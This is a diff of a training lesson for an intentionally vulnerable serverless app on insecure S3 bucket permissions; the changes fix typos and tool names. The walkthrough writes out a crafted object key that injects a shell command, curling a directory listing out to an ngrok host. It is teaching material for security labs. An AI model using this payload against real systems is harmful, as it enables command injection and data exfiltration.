@@ -1,26 +1,26 @@
 
 # LESSON #4: Insecure Cloud Configuration
 
-The DVSA is using cloud storage (i.e. S3 bucket) to upload order receipts. After a payment is processed successfully, a receipts is issued and uploaded to the bucket. When the order is processed for shipment, the file is downloaded from the bucket, modified and uploaded back as a final format receipt that is sent to the user via email.
+The DVSA uses cloud storage (i.e. S3 bucket) to upload order receipts. After a payment is processed successfully, a receipt is issued and uploaded to the bucket. When the order is processed for shipment, the file is downloaded from the bucket, modified and uploaded back as a final format receipt that is sent to the user via email.
 
-However, since the S3 is configured insecurely, it is possible to upload files to the bucket with any AWS account. For example, if you install the aws-sdk, you can simply run the command: 
+However, since the S3 is configured insecurely, it is possible to upload files to the bucket with any AWS account. For example, if you install the aws-cli, you can simply run the command: 
 
 `aws s3 cp /path/to/local/file s3://DVSA-RECEIPTS-BUCKET-{id}`
 
 ![alt s3-upload](https://i.imgur.com/K3sE1pf.png)
 
-*Note, that you won't be able to run `ls` with an account different thatn the account where the DVSA is deployed, since it is misconfigured with WRITE permissions, and not with READ. At least not yet :)*
+*Note, that you won't be able to run `ls` with an account different than the account where the DVSA is deployed, since it is misconfigured with WRITE permissions, and not with READ. At least not yet :)*
 
 Let's see how to exploit it:
 
 1. If you completed at least one order, you will receive an email with a link to download the receipt. It should look something like that:
 
-![alt receript-sample](https://i.imgur.com/XwcHgF3.png)
+![alt receipt-sample](https://i.imgur.com/XwcHgF3.png)
 
 
-You can notice that the path to the file in the bucket is the date. e.g. 2018/12/24/{receipt-uuid}.txt.
+You can notice that the path to the file in the bucket is the date. e.g. `2018/12/24/{receipt-uuid}.txt`.
 
-2. So let's fake a receipt and see what happens. Using the aws-sdk we can simply run the command:
+2. So let's fake a receipt and see what happens. Using the aws-cli we can simply run the command:
 
 ```
 aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;curl 0c971764.ngrok.io?data="$(ls)";echo x.raw' --profile hacker
